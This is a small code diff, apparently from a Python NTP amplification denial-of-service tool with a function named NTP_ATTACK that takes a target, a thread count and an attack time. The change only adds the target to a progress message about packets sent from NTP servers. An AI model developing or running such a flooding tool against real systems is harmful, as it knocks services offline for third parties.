@@ -60,7 +60,7 @@ def NTP_ATTACK(threads, attack_time, target):
 					except Exception as e:
 						print(e)
 					else:
-						print("\033[1;34m"+"[*]"+"\033[0m"+" Sending " + str(packets) + " packets from NTP server: " + server + "...")
+						print("\033[1;34m"+"[*]"+"\033[0m"+" Sending " + str(packets) + " packets from NTP server: " + server + " to " + target + "...")
 
 	# Start threads
 	for thread in range(threads):
